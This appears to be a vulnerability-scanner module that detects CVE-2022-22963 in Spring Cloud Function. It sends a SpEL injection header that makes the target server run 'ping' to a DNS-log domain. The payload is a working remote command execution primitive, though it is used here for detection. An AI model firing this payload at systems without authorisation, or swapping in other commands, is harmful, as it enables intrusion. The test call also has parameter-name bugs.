#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2022_22963.py
   Description :   CVE-2022-22963 漏洞检测模块（Spring Cloud Function 远程命令执行）
   Author :       sule01u
   date：          2023/10/8
"""
import requests
import random
from urllib.parse import urljoin
from colorama import Fore
from utils.custom_headers import USER_AGENTS, TIMEOUT
from utils.logging_config import configure_logger

# 初始化日志记录
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()

# CVE 编号
CVE_ID = "CVE-2022-22963"

# HTTP 请求头配置
HEADERS = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': random.choice(USER_AGENTS),
    'Content-Type': 'application/x-www-form-urlencoded'
}

# 默认的 DNS 日志域名（用户可指定其他 DNS 日志域名）
DEFAULT_DNS_DOMAIN = "dnslog.cn"


def check(url, dns_domain, proxy=None, session=None, timeout=TIMEOUT):
    """
    检测 CVE-2022-22963 远程代码执行漏洞
    :param url: 目标 URL
    :param dns_domain: DNS 日志域名
    :param proxy: 代理配置
    :param session: 复用的 Session 实例（可选）
    :param timeout: 请求超时时间（秒）
    :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
    """
    target_url = urljoin(url, "functionRouter")
    
    # 准备请求头
    headers = HEADERS.copy()
    headers.update({
        "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec(\"ping -c 1 " + CVE_ID + "." + dns_domain + "\")",
        "Content-Type": "application/x-www-form-urlencoded"
    })

    try:
        # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
        session = session or requests.Session()
        res = session.post(target_url, headers=headers, timeout=timeout, data="test", verify=False, proxies=proxy)

        # 输出调试信息
        logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]",
                     extra={"target": target_url})

        # 检查返回的状态码和响应内容
        if res.status_code == 500 and '"error":"Internal Server Error"' in res.text:
            details = f"{CVE_ID} vulnerability detected at {target_url}"
            if dns_domain == DEFAULT_DNS_DOMAIN:
                details += ", use the --dnslog parameter to specify your dnslog domain and then scan again"
            else:
                details += ", please check your DNS log record for confirmation"

            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
            return True, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": details
            }

        # 如果未检测到漏洞，返回 False
        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}

    except (requests.Timeout, requests.ConnectionError, requests.RequestException) as e:
        # 捕获所有请求异常，并记录到日志
        logger.error(f"[Request Error：{e}]", extra={"target": target_url})
        return False, {}
    except Exception as e:
        # 捕获所有其他未知异常，并记录到日志
        logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
        return False, {}
    finally:
        # 如果 session 是本模块创建的，则关闭（否则保持复用的 session 不被关闭）
        if not session:
            session.close()


if __name__ == "__main__":
    # 测试用例
    proxy = {"http": "http://user:password@localhost:8080", "https": "http://user:password@localhost:8080"}

    # 测试 CVE-2022-22963 漏洞检测
    is_vul, res = check("http://localhost:8081/", "5pugcrp1.eyes.sh", proxies=proxy)
    print(is_vul, res)